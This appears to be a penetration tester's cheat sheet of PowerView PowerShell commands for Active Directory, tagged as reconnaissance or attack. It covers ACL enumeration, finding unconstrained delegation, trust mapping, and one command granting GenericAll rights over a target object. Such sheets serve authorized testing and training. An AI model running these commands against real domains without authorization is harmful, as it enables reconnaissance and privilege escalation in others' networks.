# powerview

% ad, windows, powerview

## Get User from SID
#plateform/windows #target/remote  #cat/RECON 
```powershell
ConvertFrom-SID <sid>
```

## Find user ACL 
#plateform/windows #target/remote  #cat/RECON 
```powershell
Get-ObjectAcl -Identity <user> -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
```

## Find all domain user ACL
#plateform/windows #target/remote  #cat/RECON 
```powershell
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

## Find all groups our current user got access
#plateform/windows #target/remote  #cat/RECON 
```powershell
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

## Find all users our current user got access
#plateform/windows #target/remote  #cat/RECON 
```powershell
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```


## Add GenericAll to target for user
#plateform/windows #target/remote  #cat/ATTACK/EXPLOIT 
```powerview
Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <user> -Rights All
```

## Find all Computer with unconstrained delegation
#plateform/windows #target/remote  #cat/RECON 
```powershell
Get-DomainComputer -Unconstrained
```

## Get all domain trust 
#plateform/windows #target/remote  #cat/RECON 
```powershell
Get-DomainTrustMapping
```

## Get group member
```powershell
Get-DomainGroupMember -Identity "<group|Administrators>" -Domain <domain>
```

